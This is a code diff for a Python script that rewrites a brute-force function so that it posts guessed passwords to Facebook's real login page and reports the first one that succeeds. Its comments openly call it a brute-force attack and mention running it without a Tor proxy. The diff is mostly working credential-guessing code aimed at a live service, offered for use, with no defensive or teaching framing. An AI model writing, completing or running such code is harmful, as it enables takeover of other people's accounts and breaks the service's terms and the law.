@@ -1,22 +1,20 @@
 import requests
 
-# Local API details
-local_api_url = "http://127.0.0.1:5000/your-api-endpoint"
-
-# Function to perform brute force attack without Tor proxy
+# Function to perform brute force attack without proxy
 def brute_force(username, fb_id, passwords):
     for password in passwords:
         try:
-            # Example: Make a request to the local API without using a proxy
-            result = requests.get(local_api_url, params={'username': username, 'password': password}, timeout=10)
+            # Example: Make a request to Facebook login without using a proxy
+            result = requests.post('https://www.facebook.com/login.php',
+                                   data={'email': username, 'pass': password},
+                                   timeout=10)
 
-            # Process result as needed
-            print(result.text)
+            # Check if login was successful (you need to customize this based on Facebook's response)
+            if 'Welcome to Facebook' in result.text:
+                print(f"Login successful! Username: {username}, Password: {password}")
+                break
         except requests.exceptions.RequestException as e:
             print(f"Request Error: {e}")
-
-        # Rest of your brute-force logic
-        # ...
 
 # Function to read passwords from a file
 def read_passwords(file_path):
